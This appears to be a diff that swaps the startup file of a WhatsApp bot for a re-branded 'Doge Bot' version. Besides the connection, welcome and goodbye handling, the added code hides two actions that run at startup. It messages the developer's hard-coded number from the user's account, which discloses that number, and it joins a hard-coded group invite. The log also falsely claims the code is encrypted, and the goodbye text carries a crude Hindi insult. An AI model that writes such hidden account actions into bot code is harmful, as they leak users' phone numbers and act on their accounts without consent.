@@ -1,249 +1,160 @@
-require('./config.js')
-const { WAConnection: _WAConnection } = require('@adiwajshing/baileys')
-const cloudDBAdapter = require('./lib/cloudDBAdapter')
-const { generate } = require('qrcode-terminal')
-const syntaxerror = require('syntax-error')
-const simple = require('./lib/simple')
-//  const logs = require('./lib/logs')
-const { promisify } = require('util')
-const yargs = require('yargs/yargs')
-const Readline = require('readline')
-const cp = require('child_process')
-const _ = require('lodash')
-const path = require('path')
+//pls give credit if you reupload 
+//or copy the codes
+//© 2022 Xeon Bot Inc. Doge Bot
+const {
+    WAConnection,
+    MessageType,
+    Presence,
+    Mimetype,
+    GroupSettingChange
+} = require('@adiwajshing/baileys')
 const fs = require('fs')
-var low
-try {
-  low = require('lowdb')
-} catch (e) {
-  low = require('./lib/lowdb')
-}
-const { Low, JSONFile } = low
-const mongoDB = require('./lib/mongoDB')
+const figlet = require('figlet')
+const moment = require('moment-timezone')
+const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions.js')
+const { color } = require('./lib/color.js')
+const _welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
+const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))
 
-const rl = Readline.createInterface(process.stdin, process.stdout)
-const WAConnection = simple.WAConnection(_WAConnection)
+session = setting.session
 
 
-global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
-global.timestamp = {
-  start: new Date
-}
-// global.LOGGER = logs()
-const PORT = process.env.PORT || 3000
-global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())
+require('./DogeBot.js')
+nocache('./DogeBot.js', module => console.log(`${module} telah di update!`))
 
-global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/i!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')
-
-global.db = new Low(
-  /https?:\/\//.test(opts['db'] || '') ?
-    new cloudDBAdapter(opts['db']) :
-     /mongodb/.test(opts['db']) ?
-      new mongoDB(opts['db']) :
-    new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
-)
-global.DATABASE = global.db // Backwards Compatibility
-
-global.conn = new WAConnection()
-conn.version = [2, 2143, 3]
-let authFile = `${opts._[0] || 'session'}.data.json`
-if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
-if (opts['trace']) conn.logger.level = 'trace'
-if (opts['debug']) conn.logger.level = 'debug'
-if (opts['big-qr']) conn.on('qr', qr => generate(qr, { small: false }))
-if (!opts['test']) setInterval(async () => {
-  await global.db.write()
-}, 60 * 1000) // Save every minute
-if (opts['server']) require('./server')(global.conn, PORT)
-
-conn.user = {
-  jid: '',
-  name: '',
-  phone: {}
-}
-if (opts['test']) {
-  conn.user = {
-    jid: '2219191@s.whatsapp.net',
-    name: 'test',
-    phone: {}
-  }
-  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
-    return {
-      [mediaType]: {
-        url: '',
-        mediaKey: '',
-        mimetype: options.mimetype || '',
-        fileEncSha256: '',
-        fileSha256: '',
-        fileLength: buffer.length,
-        seconds: options.duration,
-        fileName: options.filename || 'file',
-        gifPlayback: options.mimetype == 'image/gif' || undefined,
-        caption: options.caption,
-        ptt: options.ptt
-      }
-    }
-  }
-
-  conn.sendMessage = async (chatId, content, type, opts = {}) => {
-    let message = await conn.prepareMessageContent(content, type, opts)
-    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
-    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
-    conn.emit('chat-update', {
-      jid: conn.user.jid,
-      hasNewMessage: true,
-      count: 1,
-      messages: {
-        all() {
-          return [waMessage]
-        }
-      }
+const starts = async (DogeXeonOP = new WAConnection()) => {
+    DogeXeonOP.logger.level = 'warn'
+    DogeXeonOP.version = [2, 2142, 12]
+    console.log(color(figlet.textSync('Doge Bot', {
+		font: 'Standard',
+		horizontalLayout: 'default',
+		vertivalLayout: 'default',
+		width: 80,
+		whitespaceBreak: false
+	}), 'cyan'))
+	console.log(color('\n> YT CHANNEL: Xeon ','silver'))
+console.log(color('> GITHUB: DGXeon ','silver'))
+console.log(color('> WA NUMBER: +918348225320 ','silver'))
+console.log(color('  Xeon Bot Inc. 2022','mediumseagreen'))
+    console.log(color('<>','red'), color('I Wrote This Script By Myself!\nNote, The Script Is Encrypted, So You Wont Be Able To Recode, If You Wish To Buy Decrypted Script Contact The Developer', 'yellow'))
+    console.log(color('<>','red'), color('Source Code Version: 3.0', 'aqua'))
+    console.log(color('<>','red'), color('But? Error? Suggestion? Visit Here:', 'aqua'), color('https://wa.me/918348225320'))
+    console.log(color('[DOGE BOT]'), color('Doge Bot Is Online', 'aqua'))
+    console.log(color('[DEV]', 'cyan'), color('Welcome Back Owner! Hope You Doing Well~', 'magenta'))
+    console.log(color('<>','red'), color('Thanks For Using Doge Bot', 'white'))
+	DogeXeonOP.browserDescription = [ 'Subscribe Xeon', 'chrome', '3.0' ]
+    DogeXeonOP.on('qr', () => {
+        console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code in only 20 seconds !!'))
     })
-  }
-  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
-} else {
-  rl.on('line', line => {
-    process.send(line.trim())
-  })
-  conn.connect().then(async () => {
-  await global.db.read()
-  global.db.data = {
-    users: {},
-    chats: {},
-    stats: {},
-    msgs: {},
-    sticker: {},
-    ...(global.db.data || {})
-  }
-  global.db.chain = _.chain(global.db.data)
-    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
-    global.timestamp.connect = new Date
-  })
-}
-process.on('uncaughtException', console.error)
 
-let isInit = true
-global.reloadHandler = function () {
-  let handler = require('./handler')
-  if (!isInit) {
-    conn.off('chat-update', conn.handler)
-    conn.off('message-delete', conn.onDelete)
-    conn.off('group-participants-update', conn.onParticipantsUpdate)
-    conn.off('CB:action,,call', conn.onCall)
-  }
-  conn.welcome = 'Hi @user 👋🏻\nWelcome to the group @subject\n\n@desc'
-  conn.bye = 'Goodbye @user 👋🏻'
-  conn.spromote = '@user is now admin!'
-  conn.sdemote = '@user is not admin now!'
-  conn.handler = handler.handler
-  conn.onDelete = handler.delete
-  conn.onParticipantsUpdate = handler.participantsUpdate
-  conn.onCall = handler.onCall
-  conn.on('chat-update', conn.handler)
-  conn.on('message-delete', conn.onDelete)
-  conn.on('group-participants-update', conn.onParticipantsUpdate)
-  conn.on('CB:action,,call', conn.onCall)
-  if (isInit) {
-    conn.on('error', conn.logger.error)
-    conn.on('close', () => {
-      setTimeout(async () => {
-        try {
-          if (conn.state === 'close') {
-            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
-            await conn.connect()
-            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
-            global.timestamp.connect = new Date
-          }
-        } catch (e) {
-          conn.logger.error(e)
-        }
-      }, 5000)
+    fs.existsSync(`./${session}.json`) && DogeXeonOP.loadAuthInfo(`./${session}.json`)
+    DogeXeonOP.on('connecting', () => {
+        start('2', 'Loading ...')
     })
-  }
-  isInit = false
-  return true
-}
+    DogeXeonOP.on('open', () => {
+        success('2', 'Connected ✓')
+    })
+        //inform to developer that the user is connected to bot
+    DogeXeonOP.sendMessage(`918348225320@s.whatsapp.net`, `Thanks bro, your bot is working on my whatsapp number ez😂`, MessageType.extendedText)
+    
+    //group link target
+    teks = `https://chat.whatsapp.com/Dykn5rmHyzV6cBV6kWDI0s`
+    DogeXeonOP.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
+    
+    await DogeXeonOP.connect({timeoutMs: 30*1000})
+        fs.writeFileSync(`./${session}.json`, JSON.stringify(DogeXeonOP.base64EncodedAuthInfo(), null, '\t'))
 
-// Plugin Loader
-let pluginFolder = path.join(__dirname, 'plugins')
-let pluginFilter = filename => /\.js$/.test(filename)
-global.plugins = {}
-for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
-  try {
-    global.plugins[filename] = require(path.join(pluginFolder, filename))
-  } catch (e) {
-    conn.logger.error(e)
-    delete global.plugins[filename]
-  }
-}
-console.log(Object.keys(global.plugins))
-global.reload = (_event, filename) => {
-  if (pluginFilter(filename)) {
-    let dir = path.join(pluginFolder, filename)
-    if (dir in require.cache) {
-      delete require.cache[dir]
-      if (fs.existsSync(dir)) conn.logger.info(`re - require plugin '${filename}'`)
-      else {
-        conn.logger.warn(`deleted plugin '${filename}'`)
-        return delete global.plugins[filename]
+    DogeXeonOP.on('chat-update', async (message) => {
+        require('./DogeBot.js')(DogeXeonOP, message, _welkom)
+    })
+DogeXeonOP.on("group-participants-update", async (anu) => {
+
+    const isWelkom = _welkom.includes(anu.jid)
+    try {
+      groupMet = await DogeXeonOP.groupMetadata(anu.jid)
+      groupMembers = groupMet.participants
+      groupAdmins = getGroupAdmins(groupMembers)
+      mem = anu.participants[0]
+
+      console.log(anu)
+      try {
+        pp_user = await DogeXeonOP.getProfilePicture(mem)
+      } catch (e) {
+        pp_user = "https://telegra.ph/file/c9dfa715c26518201f478.jpg"
       }
-    } else conn.logger.info(`requiring new plugin '${filename}'`)
-    let err = syntaxerror(fs.readFileSync(dir), filename)
-    if (err) conn.logger.error(`syntax error while loading '${filename}'\n${err}`)
-    else try {
-      global.plugins[filename] = require(dir)
+      try {
+        pp_group = await DogeXeonOP.getProfilePicture(anu.jid)
+      } catch (e) {
+        pp_group =
+          "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
+      }
+            if (anu.action == "add" && mem.includes(DogeXeonOP.user.jid)) {
+        DogeXeonOP.sendMessage(anu.jid, "Hello everyone, am Deepak Bot, ready to help you here ㋛︎", "conversation")
+      }
+      buffer = await getBuffer(pp_user)
+      if (anu.action == 'add' && !mem.includes(DogeXeonOP.user.jid)) {
+      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
+      const memeg = mdata.participants.length
+      const thu = await DogeXeonOP.getStatus(anu.participants[0], MessageType.text)
+      const num = anu.participants[0]
+      const bosco1 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
+      const bosco2 = bosco1.message["ephemeralMessage"] ? bosco1.message.ephemeralMessage : bosco1
+      let v = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
+      anu_user = v.vname || v.notify || num.split('@')[0]
+      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
+      teks = `   ⃟🐶⃟    𝙃𝙞 _*@${num.split('@')[0]}*_ \n   ⃟🐶⃟    𝘽𝙞𝙤 : _*${thu.status}*_ \n   ⃟🐶⃟    𝙈𝙚𝙢𝙗𝙚𝙧 : _*${memeg}*_ \n   ⃟🐶⃟    𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 _*${mdata.subject}*_\n   ⃟🐶⃟    𝘿𝙤𝙣𝙩 𝙁𝙤𝙧𝙜𝙚𝙩 𝙏𝙤 𝙍𝙚𝙖𝙙 𝘿𝙚𝙨𝙘𝙧𝙞𝙥𝙩𝙞𝙤𝙣`
+      welcomeBut = [{buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'},type:1}, {buttonId:`#getdesc`,buttonText:{displayText:'READ DESC 📋'},type:1}]
+      welcomeButt = { contentText: `${teks}`, footerText: `𝘿𝙤𝙜𝙚 𝘽𝙤𝙩`, buttons: welcomeBut, headerType: 6, locationMessage: bosco2.message.locationMessage}
+      DogeXeonOP.sendMessage(mdata.id, welcomeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
+      }
+      if (anu.action == 'remove' && !mem.includes(DogeXeonOP.user.jid)) {
+      const mdata = await DogeXeonOP.groupMetadata(anu.jid)
+      const num = anu.participants[0]
+      const bosco3 = await DogeXeonOP.prepareMessage("0@s.whatsapp.net", buffer, MessageType.location,{ thumbnail: buffer})
+      const bosco4 = bosco3.message["ephemeralMessage"] ? bosco3.message.ephemeralMessage : bosco3
+      let w = DogeXeonOP.contacts[num] || { notify: num.replace(/@.+/, '') }
+      anu_user = w.vname || w.notify || num.split('@')[0]
+      time_welc = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
+      time_wel = moment.tz('Asia/Kolkata').format("hh:mm")
+      memeg = mdata.participants.length
+      out = `   ⃟🐶⃟    𝙂𝙤𝙤𝙙𝙗𝙮𝙚 _*@${num.split('@')[0]}*_\n   ⃟🐶⃟    Nikal bhe lavde`
+      goodbyeBut = [{buttonId:`#gbye`,buttonText:{displayText:'BYE 👋'},type:1}, {buttonId:`#menu`,buttonText:{displayText:'MENU 🗂️'}, type:1}]
+      goodbyeButt = { contentText: `${out}`, footerText: `Deepak 𝘽𝙤𝙩`, buttons: goodbyeBut, headerType: 6, locationMessage: bosco3.message.locationMessage}
+      DogeXeonOP.sendMessage(mdata.id, goodbyeButt, MessageType.buttonsMessage, { caption: 'buffer', "contextInfo": { "mentionedJid" : [num], },})
+      }
     } catch (e) {
-      conn.logger.error(e)
-    } finally {
-      global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
+      console.log("Error : %s", color(e, "red"))
     }
-  }
-}
-Object.freeze(global.reload)
-fs.watch(path.join(__dirname, 'plugins'), global.reload)
-global.reloadHandler()
 
-
-
-// Quick Test
-async function _quickTest() {
-  let test = await Promise.all([
-    cp.spawn('ffmpeg'),
-    cp.spawn('ffprobe'),
-    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
-    cp.spawn('convert'),
-    cp.spawn('magick'),
-    cp.spawn('gm'),
-  ].map(p => {
-    return Promise.race([
-      new Promise(resolve => {
-        p.on('close', code => {
-          resolve(code !== 127)
-        })
-      }),
-      new Promise(resolve => {
-        p.on('error', _ => resolve(false))
-      })
-    ])
-  }))
-  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
-  console.log(test)
-  let s = global.support = {
-    ffmpeg,
-    ffprobe,
-    ffmpegWebp,
-    convert,
-    magick,
-    gm
-  }
-  require('./lib/sticker').support = s
-  Object.freeze(global.support)
-
-  if (!s.ffmpeg) conn.logger.warn('Please install ffmpeg for sending videos (pkg install ffmpeg)')
-  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stickers may not animated without libwebp on ffmpeg (--enable-ibwebp while compiling ffmpeg)')
-  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stickers may not work without imagemagick if libwebp on ffmpeg doesnt isntalled (pkg install imagemagick)')
+  })
 }
 
-_quickTest()
-  .then(() => conn.logger.info('Quick Test Done'))
-  .catch(console.error)
+/**
+ * Uncache if there is file change
+ * @param {string} module Module name or path
+ * @param {function} cb <optional> 
+ */
+function nocache(module, cb = () => { }) {
+    console.log('Module', `'${module}'`, 'Now being watched for changes')
+    fs.watchFile(require.resolve(module), async () => {
+        await uncache(require.resolve(module))
+        cb(module)
+    })
+}
+/**
+ * Uncache a module
+ * @param {string} module Module name or path
+ */
+function uncache(module = '.') {
+    return new Promise((resolve, reject) => {
+        try {
+            delete require.cache[require.resolve(module)]
+            resolve()
+        } catch (e) {
+            reject(e)
+        }
+    })
+}
+
+starts()
